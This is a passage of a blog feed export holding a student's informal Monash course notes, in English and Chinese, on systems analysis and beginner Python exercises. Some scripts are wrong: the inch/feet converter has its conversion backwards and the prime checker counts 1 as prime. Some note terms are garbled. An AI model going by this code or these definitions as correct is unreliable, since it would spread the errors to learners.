<ul>
<li>consist of interrelated computer components for <strong>collecting, storing, processing and analyzing</strong> data to produce the information that <strong><font color="red">helps businesses to meet their needs</font></strong> or solve their problems.</li>
</ul>
</li>
<li><p>Why Data is important?</p>
<ul>
<li>It provides functionalities to ensure critical information is stored and made available.</li>
<li><strong>better systems</strong> lead to more <strong>productive and profitable</strong> organizations.</li>
</ul>
</li>
</ol>
<p>system is a <strong>process</strong> –&gt; task -&gt; subsystem</p>
<p>requirement–&gt; need of the client</p>
<p>risk of <strong>understanding requirements</strong></p>
<ul>
<li>occur some issues</li>
<li>designing the requirements</li>
</ul>
<p>software requirement specialization</p>
<p>business website<br>Not just at present, to consider for the future</p>
<p><strong><font color="red">next week analysis</font></strong><br>a way to approach the problems<br>UML –&gt; logical padding language</p>
<hr>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><p>A system is a <strong>collection of related elements</strong> of components that work together to achieve a <font color="red">common purpose</font>.</p>
<p>Information system:<br>business; data; people; software; hardware etc</p>
<h3 id="system-amp-software"><a href="#system-amp-software" class="headerlink" title="system &amp; software"></a>system &amp; software</h3><p>system dev cycle end-to-emd</p>
<ul>
<li>people</li>
<li>processes</li>
<li>tech dev</li>
</ul>
<table>
<thead>
<tr>
<th>Activity diagram</th>
<th>Flowchart</th>
</tr>
</thead>
<tbody><tr>
<td>A graphical representation of workflows of stepwise activities and actions with support for choice, iteration, concurrency</td>
<td>A diagrammatic representation that illustrates a solution model to a given problem</td>
</tr>
<tr>
<td>helps to understand the business process or workflow of the system</td>
<td>helps to analyze &amp; design a program</td>
</tr>
<tr>
<td>Associated with UML</td>
<td>Associated with programming</td>
</tr>
</tbody></table>
<h4 id="lifecycles"><a href="#lifecycles" class="headerlink" title="lifecycles"></a>lifecycles</h4><p>&#x2F;&#x2F; iteration 迭代 implement 使生效<br>requirements-&gt;analysis-&gt;design-&gt;implement</p>
<p>iterative<br>incremental<br>iterative &amp; incremental</p>
<h3 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h3><p>a way to approach a problem</p>
<ul>
<li>models; tools; techniques</li>
</ul>
<p><strong>ways</strong> -&gt; predictive(assuming<font color="red">[risk is higher in waterfall]</font> for the client)<br>-&gt; adaptive change &amp; completing</p>
<p>Waterfall models couldn’t be predictive<br>One reason to choose waterfall is the client number&#x2F;level? is very high</p>
<p>Waterfall with Ituation will divide whole product into different parts</p>
<p>heavy weight –&gt; documentation</p>
<p>XP[Extreme Programming] -&gt; user stories</p>
<h3 id="SCRUM-2nd-assignment"><a href="#SCRUM-2nd-assignment" class="headerlink" title="SCRUM 2nd assignment!!!"></a>SCRUM 2nd assignment!!!</h3><p>sprint planning will in 4-5 weeks</p>
<h3 id="deep-structure"><a href="#deep-structure" class="headerlink" title="deep structure"></a>deep structure</h3><p>analysis –&gt; core activities </p>
<ol>
<li>info structure<ul>
<li><code>Things</code> to keep information about</li>
<li>information about things</li>
<li>relationship btw things</li>
</ul>
</li>
<li>Function structure<ul>
<li>who uses the system</li>
<li>emphasis what purpose</li>
</ul>
</li>
</ol>
<p>how your system represent the business<br>map to guide the thinking –&gt; client </p>
<h3 id="Tutorial-2-Case-1"><a href="#Tutorial-2-Case-1" class="headerlink" title="Tutorial 2 Case 1"></a>Tutorial 2 Case 1</h3><p>Core: car mental<br><em>identify important business</em><br><strong>Things#1</strong>: Cars -&gt; model type mileage<br><strong>Things#2</strong>: Drivers -&gt; Name; drive license; gender<br><strong>Things#3</strong>: Assignment -&gt; what purpose, relationship </p>
<p>Things#extra: Customers (relevant to the business), maybe system could booking, management and so on…</p>
<p><strong>Who is going to use the system</strong><br>the manager, drivers, customers</p>
<p>开启了阅读paper的思路</p>
<hr>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="lecture"><a href="#lecture" class="headerlink" title="lecture"></a>lecture</h3><h4 id="System-Development-Life-Cycle-SDLC"><a href="#System-Development-Life-Cycle-SDLC" class="headerlink" title="System Development Life Cycle (SDLC)"></a>System Development Life Cycle (SDLC)</h4><p>Key skills:</p>
<ul>
<li><strong>fact-finding</strong> for investigation of system requirements</li>
<li>learning <strong>details of business processes</strong> &amp; daily operations</li>
<li>becoming as knowledgeable as business domain users to build <strong>credibility</strong></li>
<li>bring in <strong>fresh perspectives</strong> to problem</li>
<li><strong>modelling</strong> of business processes based on system<br>requirements</li>
</ul>
<table>
<thead>
<tr>
<th>Analysis activities</th>
<th>Key questions</th>
</tr>
</thead>
<tbody><tr>
<td>Gather detailed information; Become <em>an expert in that business area</em></td>
<td>Do we have all the information (and insight) we need to define what the system must do?</td>
</tr>
<tr>
<td>Define (functional and nonfunctional) requirements; <em>Not only writing up but modelling</em></td>
<td>What in detail do we need the system to do?</td>
</tr>
<tr>
<td>Prioritise requirements(<em>Why is this activity important?</em>)</td>
<td>What are the most important things the system must do?</td>
</tr>
</tbody></table>
<p>what do you need, what do you purpose </p>
<h4 id="Good-Requirement-Statements"><a href="#Good-Requirement-Statements" class="headerlink" title="Good Requirement Statements"></a>Good Requirement Statements</h4><p><font color="red">The online banking system</font> <font color="blue">shall allow</font> the Internet user to <font color="green">access</font> her current account balance in <font color="yellow">less than 5 seconds</font>.</p>
<ol>
<li><font color="red">Defines the system under discussion</font></li>
<li><font color="blue">Verb with a correct identifier(shall&#x2F;may)</font></li>
<li><font color="green">Positive end-result</font></li>
<li><font color="yellow">Quality</font></li>
</ol>
<h3 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h3><p>requirement –&gt; <strong>need &amp; client</strong><br>client –&gt; stakeholders(internal external) –&gt; directly&#x2F; indirectly involved with the project </p>
<p>requirements are the pieces source of project for issues</p>
<p>gather requirements</p>
<ol>
<li>interview</li>
<li>surveys</li>
<li>observation </li>
<li>research –&gt; to avoid the same mistakes</li>
<li>workshop –&gt; JAD(Joint Application Development) session?</li>
</ol>
<p>Directly related to the prospect</p>
<p>Non-function requirement support </p>
<p>risk requirement </p>
<p>client has no knowledge about <strong>Non-function requirement</strong> and assume all the requirement</p>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ol>
<li>One of the toughest problems in investigating system requirements is to make sure they are complete and comprehensive. How would you ensure that you get all the right information during an interview session?</li>
</ol>
<h3 id="paper-x2F-report"><a href="#paper-x2F-report" class="headerlink" title="paper &#x2F; report"></a>paper &#x2F; report</h3><ul>
<li>Title&#x2F; abstract</li>
<li>introduction–&gt; help readers to know the research</li>
<li>methodology<ul>
<li>philosophy assumption</li>
<li>research paradigm&#x2F;&#x2F;范例，样式</li>
<li>research method</li>
<li>research techniques -&gt; data collections &#x2F; data analysis</li>
<li>Q – Methodology –&gt; A</li>
</ul>
</li>
<li>results </li>
<li>discussion(conclusion is very short&#x2F;combine)</li>
</ul>
<p>add in slides</p>
<ul>
<li>opinions or Views</li>
</ul>
<hr>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><p>requirements analysis –&gt; Result of this analysis content&#x2F; modelling<br>Design the requirements(assessments)</p>
<p>Do it using UML </p>
<p>language –&gt; implement the project</p>
<p>Context level diagram</p>
<ul>
<li>level 0 diagram(traditional approach)</li>
<li>External entities&#x2F; system name</li>
<li>I&#x2F;O flow</li>
</ul>
<p>To see the processes inside a context level diagram we use <code>use case diagram</code></p>
<ul>
<li>define the system boundary – contains the name of system</li>
<li>primary users will be on the left side of the system boundary</li>
<li>secondary users on the right side</li>
<li>use case –&gt; verb with a noun (e.g. add customer)</li>
<li>relations  include &amp; extend<ul>
<li>&lt;\include&gt; will be  before the completion</li>
</ul>
</li>
</ul>
<hr>
<h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><p>presentation</p>
<h2 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h2><p>Use case diagram<br>steps to implement the functionality</p>
]]></content>
      <categories>
        <category>Monash笔记</category>
      </categories>
      <tags>
        <tag>Monash Cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Monash Courses 2023S1 FIT9136</title>
    <url>/yakko117/2023/03/01/MonashCs9136/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>什么奇奇怪怪的大课形式</p>
<h1 id="FIT9136-Python"><a href="#FIT9136-Python" class="headerlink" title="FIT9136 Python"></a>FIT9136 Python</h1><p>虽然不用考试，但是有些知识点可以了解一下。</p>
<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><p>简单的通识教育<br><a href="https://runestone.academy/ns/books/published/fopp/index.html">学校给的参考文献</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Ask for radius</span></span><br><span class="line">radius = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the radius: &quot;</span>))</span><br><span class="line"><span class="comment">#let area = (radius2) × π</span></span><br><span class="line">area = (radius * radius) * <span class="number">3.1415</span></span><br><span class="line"><span class="comment">#Display area</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The area of a circle with radius&quot;</span>, radius, <span class="string">&quot;is:&quot;</span>, <span class="string">&#x27;%.4f&#x27;</span>%area)</span><br><span class="line"><span class="comment"># 保留指定小数</span></span><br></pre></td></tr></table></figure></div>

<p>Algorithms is <strong>A step by step sequence of instructions that if followed exactly will solve the problem under consideration.</strong></p>
<ul>
<li>Algorithms are like recipes: they must be followed exactly, they must be clear and unambiguous, and they must end.</li>
</ul>
<p> 特点在 <code>Natural languages</code> 而不在 <code>formal languages</code></p>
<ul>
<li><p>ambiguity含糊, redundancy冗余, and literalness字义的，表面意义的.</p>
</li>
<li><p>Syntax errors found by compiler &amp; interpreter.</p>
</li>
<li><p>Runtime errors found by interpreter.</p>
</li>
<li><p>The programmers could find semantic errors. &#x2F;&#x2F; 语义语法</p>
</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math;</span><br><span class="line"></span><br><span class="line">num_1 = <span class="built_in">input</span>(<span class="string">&quot;Enter a digit: &quot;</span>)</span><br><span class="line">num_2 = <span class="string">&quot;10&quot;</span> </span><br><span class="line"><span class="comment"># 不建议以“10”的字符形式输入</span></span><br><span class="line">t = num_2 + num_1 </span><br><span class="line"><span class="comment"># 这里是字符串拼接，所以如果输入负数就会报错，烂</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(t) &gt; <span class="number">1010</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num 1 is larger than num 2&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num 2 is larger than num 1&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>上课教了一些gitlab的使用教程</p>
<h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><p><strong>Inch to Feet Converter</strong>: Write step-by-step instructions for converting inch to feet</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ques = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pls select which convert type</span></span><br><span class="line"><span class="string">        1. inch to Feet</span></span><br><span class="line"><span class="string">        2. feet to inch</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ques)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;pls input the select num: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the inch num:&quot;</span>))</span><br><span class="line">    c = <span class="built_in">float</span>(b*<span class="number">12</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the feet num is&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> a == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the feet num:&quot;</span>))</span><br><span class="line">    d = <span class="built_in">float</span>(b/<span class="number">12</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the inch num is&quot;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid input&quot;</span>)</span><br></pre></td></tr></table></figure></div>


<p><strong>Simple Calculator</strong>: Write step-by-step instructions for developing a simple calculator.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the first num: &quot;</span>))</span><br><span class="line"></span><br><span class="line">op = <span class="built_in">input</span>(<span class="string">&quot;pls input the calc :&quot;</span>)</span><br><span class="line">b = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&quot;pls input the second num:&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> op == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">    c = a+b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">    d = a-b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">    d = a*b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> op == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">    d = a/b</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the answer is&quot;</span>,d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Invalid input&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><p>大课写点小的课堂作业(很水的课)</p>
<p><strong>Which of the following is an invalid variable name in Python?</strong><br><code>isTrue</code>； <code>is_true</code>； <code>True</code>； <code>true</code></p>
<p>The <font color="red">invalid variable name</font> in Python from the options given is <code>True</code>.<br><code>True</code> is a reserved keyword in Python, and it cannot be used as a variable name. Python uses True to represent boolean true values.<br><strong>The other options, isTrue, is_true, and true</strong>, are valid variable names in Python. However, it is recommended to use snake_case (i.e., all lowercase with underscores between words) for variable names in Python.</p>
<p><strong>Is the following a block statement? Why?</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">counter = <span class="number">5</span> </span><br><span class="line">    <span class="built_in">print</span> (counter) </span><br><span class="line">    counter = <span class="number">1</span> </span><br></pre></td></tr></table></figure></div>

<p>No, because a block of statements requires a control structure that determines the flow of execution for a program, and spans across multiple lines. </p>
<p>Syntactic error &#x2F;&#x2F; 语法语句错误<br>Semantic error &#x2F;&#x2F; 语义错误<br><em>(Note: &#x3D; use for assignment and &#x3D;&#x3D; used for comparison)</em></p>
<h3 id="homework-1"><a href="#homework-1" class="headerlink" title="homework"></a>homework</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Input a number of bits: &quot;</span>))</span><br><span class="line"></span><br><span class="line">MB = <span class="built_in">int</span>(a/(math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">2</span>)*<span class="number">8</span>))</span><br><span class="line">KB = <span class="built_in">int</span>(a/(math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">1</span>)*<span class="number">8</span>)-(MB*<span class="number">1024</span>))</span><br><span class="line">B = <span class="built_in">int</span>((a/<span class="number">8</span>)-(MB*math.<span class="built_in">pow</span>(<span class="number">1024</span>,<span class="number">2</span>)+(KB*<span class="number">1024</span>)))</span><br><span class="line">b = <span class="built_in">int</span>(a%<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a,<span class="string">&quot;b =&quot;</span>,MB,<span class="string">&#x27;MB&#x27;</span>,KB,<span class="string">&#x27;KB&#x27;</span>,B,<span class="string">&#x27;B&#x27;</span>,b,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p><strong>Compute Fibonacci Numbers</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_0 =&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_1 =&quot;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_2 =&quot;</span>, <span class="number">0</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_3 =&quot;</span>, <span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fiboloop</span>():</span><br><span class="line">    a, b =<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="built_in">sum</span> = a+b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n),<span class="string">&quot;=&quot;</span>,<span class="built_in">sum</span>)</span><br><span class="line">        a = b</span><br><span class="line">        b = <span class="built_in">sum</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;that&#x27;s end&quot;</span>)</span><br><span class="line"></span><br><span class="line">Fiboloop()</span><br></pre></td></tr></table></figure></div>

<p><strong>Using Python to Approximate the Golden Ratio</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">2.2</span>**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GoldenRatio</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        n = <span class="number">0.0002</span>*i</span><br><span class="line">        a = <span class="number">2.2</span>+n</span><br><span class="line">        calc = a**<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> calc &gt;<span class="number">5.000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No.&quot;</span>,i,<span class="string">&quot;the clac is&quot;</span>,calc,<span class="string">&quot;the num is&quot;</span>,a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">GoldenRatio()</span><br></pre></td></tr></table></figure></div>

<p><strong>Using Fibonacci Numbers to Approximate the Golden Ratio</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_0 =&quot;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_1 =&quot;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_2 =&quot;</span>, <span class="number">0</span>+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;F_3 =&quot;</span>, <span class="number">1</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fiboloop</span>():</span><br><span class="line">    a, b =<span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">sum</span> = a+b</span><br><span class="line">        a = b</span><br><span class="line">        b = <span class="built_in">sum</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n),<span class="string">&quot;=&quot;</span>,<span class="built_in">sum</span>)</span><br><span class="line">        res = b/a</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;F_&quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot;/F_&quot;</span>+<span class="built_in">str</span>(n-<span class="number">1</span>)+<span class="string">&quot;=&quot;</span>, res)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1.618</span>&lt;=res&lt;=<span class="number">1.61805</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Fiboloop()</span><br></pre></td></tr></table></figure></div>
<hr>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>水的很 都是简单I&#x2F;O<br>Assignment1 是个扑克牌抽牌游戏 没意思</p>
<hr>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="GPA-Calculator"><a href="#GPA-Calculator" class="headerlink" title="GPA Calculator"></a>GPA Calculator</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_grade_value</span>(<span class="params">mark</span>):</span><br><span class="line">    <span class="keyword">if</span> mark &gt;= <span class="number">80</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">70</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">60</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2.0</span></span><br><span class="line">    <span class="keyword">elif</span> mark &gt;= <span class="number">50</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gpa</span>(<span class="params">unit_credit, stud_marks</span>):</span><br><span class="line">    total_credit = <span class="number">0</span></span><br><span class="line">    total_grade = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(unit_credit)):</span><br><span class="line">        credit = unit_credit[i]</span><br><span class="line">        mark = stud_marks[i]</span><br><span class="line">        grade_value = get_grade_value(mark)</span><br><span class="line">        total_credit += credit</span><br><span class="line">        total_grade += grade_value * credit</span><br><span class="line">    gpa = total_grade / total_credit</span><br><span class="line">    <span class="keyword">return</span> gpa</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unit Credit list  </span></span><br><span class="line">unit_credit = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Students Data</span></span><br><span class="line">students_data = [[<span class="string">&#x27;Bruce&#x27;</span>, <span class="number">72</span>, <span class="number">75</span>, <span class="number">100</span>, <span class="number">89</span>],</span><br><span class="line">                [<span class="string">&#x27;Clark&#x27;</span>, <span class="number">92</span>, <span class="number">20</span>, <span class="number">81</span>, <span class="number">68</span>],</span><br><span class="line">                [<span class="string">&#x27;John&#x27;</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">45</span>, <span class="number">57</span>],</span><br><span class="line">                [<span class="string">&#x27;Barry&#x27;</span>, <span class="number">55</span>, <span class="number">80</span>, <span class="number">94</span>, <span class="number">71</span>],</span><br><span class="line">                [<span class="string">&#x27;Diana&#x27;</span>, <span class="number">84</span>, <span class="number">71</span>, <span class="number">100</span>, <span class="number">70</span>],</span><br><span class="line">                [<span class="string">&#x27;Arthur&#x27;</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">40</span>, <span class="number">47</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your solution goes here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> student <span class="keyword">in</span> students_data:</span><br><span class="line">    name = student[<span class="number">0</span>]</span><br><span class="line">    marks = student[<span class="number">1</span>:]</span><br><span class="line">    gpa = get_gpa(unit_credit, marks)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> got <span class="subst">&#123;gpa:<span class="number">.3</span>f&#125;</span> GPA&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="Prime-Number"><a href="#Prime-Number" class="headerlink" title="Prime Number"></a>Prime Number</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_prime</span>(<span class="params">number</span>):</span><br><span class="line">    <span class="comment"># enter_num = int(input(&quot;pls enter a number: &quot;))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, number):</span><br><span class="line">        <span class="keyword">if</span> number % idx == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(number,&quot; is not a prime number&quot;)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># print(number,&quot;is a prime number&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime_number</span>(<span class="params">number, enter_num</span>):</span><br><span class="line">    enter_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;pls enter a number: &quot;</span>))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> check_prime(number):</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count &gt; enter_num:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The&quot;</span>,enter_num,<span class="string">&quot;prime number is&quot;</span>,number)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">start=<span class="number">1</span></span><br><span class="line">end=<span class="number">1000</span></span><br><span class="line">get_prime_number(start, end)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 3 5 7 11 13 17 19 23 29</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Palindrome"><a href="#Palindrome" class="headerlink" title="Palindrome"></a>Palindrome</h3><p>Write a python function named <code>check_palindrome</code>, which takes a single argument named arg of string type and returns a two different values,<br>i.e., boolean value and type value.</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Enter a value: <span class="number">12321</span></span><br><span class="line">(<span class="literal">True</span>, <span class="string">&#x27;Integer&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>isalpha()</code> 方法可以检查字符串中是否仅包含字母，如果字符串中包含除字母以外的字符，它将返回False。</p>
